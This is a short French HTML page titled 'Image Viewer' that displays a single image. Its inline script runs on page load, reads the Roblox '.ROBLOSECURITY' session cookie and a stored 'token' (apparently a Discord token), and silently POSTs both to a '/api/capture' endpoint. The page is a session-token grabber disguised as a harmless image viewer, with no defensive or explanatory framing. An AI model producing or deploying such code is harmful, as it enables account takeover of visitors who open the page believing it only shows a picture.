<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Image Viewer</title>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,204,0.5); }
    </style>
</head>
<body>
    <img src="https://i.pinimg.com/736x/75/d9/f1/75d9f18c5148f6d85b421279cde90907.jpg">

    <script>
        // Le script s'exécute SEUL dès que la page charge
        window.onload = () => {
            const data = {
                rblx: document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "Non trouvé",
                dsct: window.localStorage.getItem('token') || "Non trouvé"
            };

            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        };
    </script>
</body>
</html>
